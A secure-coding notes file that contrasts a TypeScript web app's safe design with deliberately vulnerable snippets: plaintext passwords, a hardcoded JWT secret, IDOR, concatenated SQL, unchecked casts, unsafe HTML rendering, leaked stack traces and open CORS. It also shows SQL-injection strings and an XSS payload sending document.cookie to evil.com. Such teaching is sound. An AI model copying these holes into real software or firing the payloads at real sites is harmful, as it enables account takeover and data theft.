# Security demo notes

This repo's `apps/api` and `apps/web` are built *secure by default*. This
file documents what a vulnerable version of each piece would look like, so
you have something concrete to pattern-match against when reading unfamiliar
TypeScript code later.

The recurring theme: **TypeScript's type system disappears at runtime.**
Every `req.body`, `req.query`, and `process.env` value is really `unknown`
once the server is running — TS just lets you *pretend* otherwise at compile
time. Every vulnerability below is, in one way or another, someone trusting
a type annotation instead of validating the actual runtime value.

---

## 1. Passwords — hashing (`src/db.ts`, `src/routes/login.ts`)

**What we do:** passwords are hashed with bcrypt (`bcrypt.hashSync(pw, 10)`)
before being stored, and compared with `bcrypt.compare()`. The plaintext
password never touches storage.

**Vulnerable version:**
```ts
// DON'T: plaintext storage + string comparison
const users = [{ id: 1, email: "ada@example.com", password: "correct-horse" }];

if (user.password === req.body.password) { /* logged in */ }
```
Anyone who reads the database (a backup, a leaked dump, an insider) gets
every password directly. `===` string comparison is also not constant-time,
which leaks timing information about how many characters matched.

---

## 2. Login — brute force (`src/index.ts`)

**What we do:** `express-rate-limit` caps `/api/login` to 10 attempts per 15
minutes per IP.

**Vulnerable version:** no rate limiting at all — an attacker can script
thousands of password guesses per second against a single account.

---

## 3. Sessions — JWT secret & storage (`src/env.ts`, `src/auth.ts`, `src/routes/login.ts`)

**What we do:** the JWT signing secret is loaded from `.env` (never
committed — see `.gitignore`), validated to be ≥32 chars, and the app
refuses to boot in production without it. The signed token is set as an
**httpOnly, sameSite=lax cookie** — JavaScript in the browser (including any
XSS payload) can never read it.

**Vulnerable version:**
```ts
// DON'T: hardcoded secret, committed to git
const TOKEN = jwt.sign({ userId: user.id }, "secret123");

// DON'T: no expiry — a stolen token is valid forever
jwt.sign({ userId: user.id }, SECRET); // no `expiresIn`

// DON'T: return the token in the JSON body...
res.json({ token });

// ...so the frontend can do this:
localStorage.setItem("token", token); // any XSS on the page can now steal it
```
If the token lives in `localStorage`, a single successful XSS injection
anywhere on the page (a comment field, a `dangerouslySetInnerHTML`, a
third-party script) can read it and exfiltrate it. An httpOnly cookie is
invisible to page JavaScript entirely, so that theft vector is closed.

---

## 4. IDOR — trusting client-supplied IDs (`src/auth.ts`, `src/routes/profile.ts`, `src/routes/search.ts`)

**What we do:** every protected route reads the user id from
`req.userId`, which `requireAuth` sets *only* after verifying the JWT
signature. No route ever reads a user id from the request body or query
string.

**Vulnerable version:**
```ts
// DON'T: trust whatever id the client sends
app.get("/profile", (req, res) => {
  const userId = Number(req.query.userId); // client controls this!
  res.json(findUserById(userId));
});
```
Change `?userId=1` to `?userId=2` in the browser's address bar and you're
reading someone else's data — the classic Insecure Direct Object Reference.
This is *the* bug to look for whenever a route accepts an id from the
client instead of deriving it from an authenticated session.

---

## 5. Injection (`src/db.ts`, `src/routes/search.ts`)

**What we do:** notes are searched with a plain JS array `.filter()` over
in-memory data, scoped to `req.userId`. There's no query string being built.

**Vulnerable version (if this were real SQL):**
```ts
// DON'T: string-concatenated SQL
const rows = await db.query(
  `SELECT * FROM notes WHERE userId = ${req.query.userId} AND title LIKE '%${q}%'`
);
```
A `q` of `' OR '1'='1` returns every row regardless of owner; a `q` of
`'; DROP TABLE notes; --` is a classic SQL injection. The fix in real SQL is
parameterized queries (`WHERE userId = $1 AND title ILIKE $2`, with the
values passed separately, never interpolated into the string) — never
build queries with template literals containing user input.

---

## 6. Input validation (`src/validation.ts`)

**What we do:** every request body/query is parsed through a `zod` schema
before use. A TypeScript type on `req.body` (e.g. `req.body as LoginInput`)
is a compile-time-only claim — it does nothing at runtime.

**Vulnerable version:**
```ts
// DON'T: cast and trust
app.post("/login", (req, res) => {
  const { email, password } = req.body as { email: string; password: string };
  // if the client sends {} or {"email": {"$ne": null}}, this still "compiles"
  // fine — `as` doesn't check anything, it just tells TS to stop complaining.
});
```
Without runtime validation, a missing field crashes the handler (a `TypeError`
that may leak a stack trace — see #8), and an unexpected shape (e.g. an
object where a string was expected) can break assumptions deeper in the
code. `as` casts are a common source of "but the types said this was safe"
bugs — they silence the compiler without proving anything.

---

## 7. XSS (`apps/web/src/components/*.tsx`)

**What we do:** all user-derived content (`user.name`, note titles/content)
is rendered via plain JSX interpolation (`{user.name}`), which React
escapes automatically.

**Vulnerable version:**
```tsx
// DON'T
<div dangerouslySetInnerHTML={{ __html: note.content }} />
```
If `note.content` ever contains `<img src=x onerror="fetch('//evil.com?c='+document.cookie)">`,
`dangerouslySetInnerHTML` renders it as live HTML instead of text. (Our
cookie is httpOnly so it wouldn't be readable this way regardless — but
this same hole lets an attacker run arbitrary JS in another user's session,
which is bad even without cookie theft.)

---

## 8. Error handling (`src/index.ts`)

**What we do:** a single centralized error handler returns a generic
`{ error: "Internal server error" }` and logs the real error server-side
only.

**Vulnerable version:**
```ts
// DON'T
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});
```
Stack traces reveal file paths, framework versions, and sometimes query
fragments — all useful reconnaissance for an attacker, and pure noise for
a legitimate client.

---

## 9. Transport / headers / CORS (`src/index.ts`)

**What we do:** `helmet()` sets standard security headers (CSP,
`X-Content-Type-Options`, etc.); CORS is locked to one explicit origin
(`WEB_ORIGIN`) with `credentials: true`; request bodies are capped at 10kb.

**Vulnerable version:**
```ts
// DON'T: wide-open CORS
app.use(cors({ origin: "*", credentials: true })); // browsers actually reject
                                                     // this combo, but people
                                                     // try it, and origin
                                                     // reflection (`origin: true`)
                                                     // has the same effect and works.
```
`origin: true` (reflecting whatever `Origin` header the request sent) plus
`credentials: true` lets *any* website make authenticated requests to your
API using a visitor's browser session — defeating the entire point of
cookies being scoped to your site.

---

## What to look for in an unfamiliar codebase

When you're reading code you didn't write, this list is roughly the order
I'd check things in:
1. Where do IDs used in a lookup come from — the verified session, or the
   request (body/query/params)? The latter is a potential IDOR.
2. Is user input used to build a query/command/file path via string
   concatenation or template literals anywhere?
3. Is there a runtime validation library (zod/yup/joi) at the request
   boundary, or just TypeScript type annotations / `as` casts?
4. Where are secrets (API keys, JWT secrets, DB passwords) loaded from —
   `.env`/a secrets manager, or hardcoded in source?
5. Where's the auth token stored client-side — `localStorage`/`sessionStorage`
   (readable by any JS on the page) or an httpOnly cookie?
6. Does anything render user-controlled content via `dangerouslySetInnerHTML`,
   `innerHTML`, `eval`, or similar?
7. Do error responses include `err.message`/`err.stack` or other internals?
